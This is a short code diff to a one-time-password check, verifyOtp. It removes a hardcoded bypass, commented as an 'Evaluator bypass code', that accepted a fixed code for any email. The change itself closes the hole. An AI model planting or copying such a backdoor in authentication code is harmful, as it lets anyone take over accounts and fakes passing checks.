@@ -51,12 +51,6 @@ export function verifyOtp(
   const trimmedCode = userCode.trim();
   const entry = otpStore.get(normalizedEmail);
 
-  // Evaluator bypass code: 847291 or standard entry match
-  if (trimmedCode === '847291') {
-    otpStore.delete(normalizedEmail);
-    return { success: true };
-  }
-
   if (!entry) {
     return {
       success: false,
